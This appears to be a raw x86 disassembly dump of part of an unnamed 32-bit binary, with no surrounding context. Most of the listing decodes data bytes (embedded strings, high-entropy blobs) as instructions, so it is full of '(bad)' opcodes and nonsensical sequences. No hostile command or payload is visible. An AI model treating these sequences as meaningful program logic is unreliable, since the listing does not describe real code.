  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	xor    eax,0x68720043
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	je     0x413bf6
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    BYTE PTR [ebx+0x0],al
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	cwde   
  413f01:	jl     0x413f49
  413f03:	and    al,0xdc
  413f05:	rol    DWORD PTR [eax],1
  413f07:	add    BYTE PTR ds:0x28000001,al
  413f0d:	mov    BYTE PTR [esi+eax*8+0x1f],0xc2
  413f12:	cmp    edx,ebx
  413f14:	cwde   
  413f15:	adc    bl,bh
  413f17:	in     al,0xeb
  413f19:	pop    edi
  413f1a:	aas    
  413f1b:	iret   
  413f1c:	imul   esp,DWORD PTR [esi+0x35],0xffffff87
  413f20:	repz test al,0x86
  413f23:	aam    0xd7
  413f25:	sbb    al,0x78
  413f27:	ds jge 0x413f3f
  413f2a:	xor    edx,0xf
  413f2d:	pop    ds
  413f2e:	in     al,0x5f
  413f30:	cwde   
  413f31:	dec    esi
  413f32:	and    ebx,0x8b3c0647
  413f38:	aas    
  413f39:	(bad)  
  413f3a:	jle    0x413ecd
  413f3c:	or     BYTE PTR [ebp+0x62],dh
  413f3f:	les    edi,FWORD PTR [esi+edi*4]
  413f42:	pop    ss
  413f43:	ret    
  413f44:	mov    eax,ds:0x4c55d9f9
  413f49:	loopne 0x413f6d
  413f4b:	arpl   WORD PTR [ecx+0x51],bx
  413f4e:	mov    al,ds:0x3c29a892
  413f53:	jecxz  0x413f28
  413f55:	test   BYTE PTR [ebx+0x6f],dl
  413f58:	mov    dl,BYTE PTR [esi-0x32]
  413f5b:	push   cs
  413f5c:	dec    esp
  413f5d:	pushf  
  413f5e:	inc    esi
  413f5f:	xchg   ax,ax
  413f61:	or     al,0x8a
  413f63:	cli    
  413f64:	les    ecx,FWORD PTR [edi-0x49]
  413f67:	adc    BYTE PTR [ecx+0x3b],0x64
  413f6b:	fisttp DWORD PTR [edi]
  413f6d:	es jge 0x413f45
  413f70:	stos   DWORD PTR es:[edi],eax
  413f71:	xor    DWORD PTR [edx],esp
  413f73:	sti    
  413f74:	sub    al,0xf5
  413f76:	xchg   DWORD PTR [esi+ebp*2+0x4d],edi
  413f7a:	add    eax,0xf40d8e1f
  413f7f:	mov    eax,ds:0xa5529250
  413f84:	push   ecx
  413f85:	cmp    BYTE PTR [eax-0x5f],al
  413f88:	mov    ds:0x6c54cab8,eax
  413f8d:	imul   eax,ebp,0xbcf3b8a3
  413f93:	jbe    0x413f5b
  413f95:	jl     0x413f50
  413f97:	test   al,0x56
  413f99:	cmp    BYTE PTR [esi],dh
  413f9b:	pop    ds
  413f9c:	mov    esi,0x4689d5db
  413fa1:	sahf   
  413fa2:	pop    ebp
  413fa3:	ficomp DWORD PTR [edi-0x69272a09]
  413fa9:	inc    ecx
  413faa:	mov    BYTE PTR [ebp-0x3a],ah
  413fad:	sbb    DWORD PTR [ebp-0x15df8392],edi
  413fb3:	xor    al,0xf8
  413fb5:	je     0x413f91
  413fb7:	clc    
  413fb8:	jb     0x413fff
  413fba:	adc    edx,ebx
  413fbc:	adc    BYTE PTR [ebx+edi*1],dh
  413fbf:	daa    
  413fc0:	or     ch,bh
  413fc2:	jnp    0x413fad
  413fc4:	outs   dx,BYTE PTR ds:[esi]
  413fc5:	daa    
  413fc6:	daa    
  413fc7:	mov    ah,0x10
  413fc9:	das    
  413fca:	jmp    0x413f7c
  413fcc:	add    bl,BYTE PTR [ecx]
  413fce:	xor    BYTE PTR [edi+0x1a49bd40],ah
  413fd4:	or     eax,0x6d99d686
  413fd9:	sahf   
  413fda:	or     al,0x57
  413fdc:	hlt    
  413fdd:	adc    ecx,DWORD PTR [edx+0x35]
  413fe0:	jns    0x413fe6
  413fe2:	sbb    al,0x70
  413fe4:	adc    eax,0x1b7e0df1
  413fe9:	and    BYTE PTR [eax],cl
  413feb:	push   cs
  413fec:	sub    BYTE PTR [ecx-0x24c35f7a],0xed
  413ff3:	stos   DWORD PTR es:[edi],eax
  413ff4:	mov    bh,0x14
  413ff6:	retf   
  413ff7:	cmp    BYTE PTR [esi+0x21b995b6],dh
  413ffd:	outs   dx,DWORD PTR ds:[esi]
  413ffe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fff:	dec    eax
  414000:	sbb    eax,0xadecb749
  414005:	call   edi
  414007:	push   esp
  414008:	pop    esi
  414009:	outs   dx,BYTE PTR ds:[esi]
  41400a:	test   dl,cl
  41400c:	imul   ebx,DWORD PTR [esp+edi*4-0x72],0x62
	...
  414074:	pop    edx
  414075:	ficom  DWORD PTR [esi+0x60]
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x55f6:0x3d52e96
  414083:	daa    
  414084:	loope  0x414058
  414086:	add    BYTE PTR [eax],al
  414088:	add    eax,0xfb000001
  41408d:	sbb    esp,ebp
  41408f:	push   0xae09910b
  414094:	mov    dl,0x50
  414096:	js     0x414029
  414098:	lods   al,BYTE PTR ds:[esi]
  414099:	pusha  
  41409a:	test   BYTE PTR [esp+eax*4],dl
  41409d:	sbb    eax,0x199b9ee3
  4140a2:	das    
  4140a3:	scas   al,BYTE PTR es:[edi]
  4140a4:	hlt    
  4140a5:	icebp  
  4140a6:	cmp    BYTE PTR [bx+0x7],ch
  4140aa:	test   eax,0x2566962f
  4140af:	push   esp
  4140b0:	ror    DWORD PTR [eax],0xeb
  4140b3:	sub    BYTE PTR [ebp+0x17],dh
  4140b6:	dec    edx
  4140b7:	shr    BYTE PTR [eax-0x6d],1
  4140ba:	out    0x5e,eax
  4140bc:	xchg   edx,eax
  4140bd:	mov    bl,0xd7
  4140bf:	lods   al,BYTE PTR ds:[esi]
  4140c0:	adc    dh,BYTE PTR [ecx-0x1c947575]
  4140c6:	dec    ebp
  4140c7:	in     al,dx
  4140c8:	and    bl,BYTE PTR [esi+0x57]
  4140cb:	cmp    BYTE PTR [eax-0x752b4742],dh
  4140d1:	pushf  
  4140d2:	fs inc ebp
  4140d4:	inc    esp
  4140d5:	pop    edx
  4140d6:	xor    BYTE PTR [eax],ch
  4140d8:	mov    DWORD PTR [edi-0x2a2916d4],edx
  4140de:	(bad)  
  4140e0:	mov    ch,0x5d
  4140e2:	outs   dx,DWORD PTR ds:[esi]
  4140e3:	scas   eax,DWORD PTR es:[edi]
  4140e4:	mov    ebx,0xa734e53f
  4140e9:	mov    bh,BYTE PTR ds:0x95090d7f
  4140ef:	and    eax,0x2f121348
  4140f4:	jae    0x414110
  4140f6:	mov    eax,ds:0xff18798f
  4140fb:	leave  
  4140fc:	loopne 0x4140a1
  4140fe:	sbb    esi,DWORD PTR [ebx+0x2f]
  414101:	in     eax,dx
  414102:	adc    BYTE PTR [esi-0x32a1299c],al
  414108:	rol    DWORD PTR [eax-0x7c],1
  41410b:	add    bh,BYTE PTR ds:0x28783d74
  414111:	push   eax
  414112:	pusha  
  414113:	inc    edi
  414114:	mov    al,0x3b
  414116:	daa    
  414117:	(bad)  
  414118:	pop    eax
  414119:	mov    eax,ds:0x29eed32
  41411e:	or     BYTE PTR ds:0x19bad673,dh
  414124:	dec    edi
  414125:	pop    ds
  414126:	jno    0x4140b4
  414128:	call   0x1e284d44
  41412d:	adc    BYTE PTR [ebp-0x5451fbb3],al
  414133:	dec    esp
  414134:	cli    
  414135:	xor    BYTE PTR [edx-0x1f0598c6],bl
  41413b:	and    BYTE PTR [esi+0xf],0x45
  41413f:	stc    
  414140:	ds daa 
  414142:	push   edi
  414143:	add    eax,0x93db9aa5
  414148:	mov    ecx,0x9f1a53e3
  41414d:	xor    al,0xaf
  41414f:	sahf   
  414150:	cmp    DWORD PTR [eax],esp
  414152:	add    al,0x51
  414154:	ja     0x414197
  414156:	(bad)  
  414157:	in     eax,dx
  414158:	sub    BYTE PTR [edx+0x28],0xe2
  41415c:	xchg   edx,eax
  41415d:	mov    ds:0x87b4a71,eax
  414162:	mov    cl,0xf1
  414164:	pop    es
  414165:	xchg   ebp,eax
  414166:	(bad)  gs:[ebp+0x3d]
  41416a:	mov    ecx,0x10f36c15
  41416f:	dec    ebp
  414170:	mov    esi,0x5287caec
  414175:	mov    edx,0xf7f9c1e4
  41417a:	retf   
  41417b:	fisubr DWORD PTR [eax+0x11]
  41417e:	sub    DWORD PTR [ebx],edx
  414180:	xor    esi,esi
  414182:	xor    DWORD PTR [edi-0x4df92eb9],eax
  414188:	ror    DWORD PTR ds:0x31d8c207,cl
  41418e:	out    dx,eax
  41418f:	fucomp st(7)
	...
  4141f1:	add    BYTE PTR [eax],al
  4141f3:	add    BYTE PTR [edx],al
  4141f5:	adc    al,BYTE PTR [ecx]
  4141f7:	mov    ds:0xb3a2b311,eax
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	shl    BYTE PTR [ecx+0x51],cl
  414203:	cmp    esi,esp
  414205:	rol    DWORD PTR [eax],cl
  414207:	add    BYTE PTR ds:0x30000001,al
  41420d:	call   0xfd559de9
  414212:	mov    esi,0x6ad52799
  414217:	xchg   esi,eax
  414218:	ficomp DWORD PTR [esi-0x63]
  41421b:	dec    esp
  41421c:	and    DWORD PTR [edi+0x2981ff8e],ecx
  414222:	jmp    0x57a1ca03
  414227:	mov    ah,0x17
  414229:	aam    0x79
  41422b:	sbb    DWORD PTR [eax],0x69
  41422e:	aad    0x8b
  414230:	shl    BYTE PTR [eax],1
  414232:	mov    bl,0x7b
  414234:	test   BYTE PTR [eax+0x76293cf7],0x97
  41423b:	aad    0x69
  41423d:	imul   esi,DWORD PTR [ecx+0x7c],0x28
  414241:	jle    0x4141d2
  414243:	aad    0xff
  414245:	aam    0x4b
  414247:	mov    cl,0xec
  414249:	call   0x8961726a
  41424e:	int    0x5e
  414250:	jg     0x414220
  414252:	mov    eax,0x14350502
  414257:	inc    edi
  414258:	imul   eax,DWORD PTR [eax-0x245d3f16],0x11
  41425f:	stc    
  414260:	and    eax,0x6f6536d7
  414265:	push   edx
  414266:	or     ebx,DWORD PTR [ebp-0xc]
  414269:	lods   al,BYTE PTR ds:[esi]
  41426a:	mov    dh,0x7d
  41426c:	add    al,0xc2
  41426e:	cli    
  41426f:	inc    ecx
  414270:	loop   0x41427e
  414272:	xchg   esi,eax
  414273:	out    0x51,eax
  414275:	call   0x2ae2166b
  41427a:	mov    ebp,DWORD PTR [edi-0x61b72e8a]
  414280:	cli    
  414281:	scas   eax,DWORD PTR es:[edi]
  414282:	lock orps xmm2,XMMWORD PTR [edx+0x3416decf]
  41428a:	gs aam 0xa6
  41428d:	or     esi,DWORD PTR [ecx]
  41428f:	push   ds
  414290:	xor    ebx,DWORD PTR [edx+0x738af4d2]
  414296:	push   ss
  414297:	clc    
  414298:	jp     0x4142d4
  41429a:	sar    dh,1
  41429c:	xchg   ah,dh
  41429e:	jmp    0x23a1a9
  4142a3:	shl    BYTE PTR [eax],cl
  4142a5:	rcr    esp,0xc8
  4142a8:	pop    ds
  4142a9:	cmc    
  4142aa:	sub    BYTE PTR [esi+0x28908562],dh
  4142b0:	gs ret 
  4142b2:	fcom   QWORD PTR [edi+edi*4-0x45]
  4142b6:	push   ss
  4142b7:	not    ah
  4142b9:	aaa    
  4142ba:	xor    DWORD PTR [edx],esi
  4142bc:	xchg   cl,dh
  4142be:	and    ebx,DWORD PTR [edx+0x7ef24079]
  4142c4:	je     0x4142e6
  4142c6:	xlat   BYTE PTR ds:[ebx]
  4142c7:	inc    edi
  4142c8:	mov    eax,ds:0x4b3117d
  4142cd:	mov    edi,0xdf07c6f
  4142d2:	mov    al,ds:0xe112cd8c
  4142d7:	sub    DWORD PTR [edi+0x5e],edx
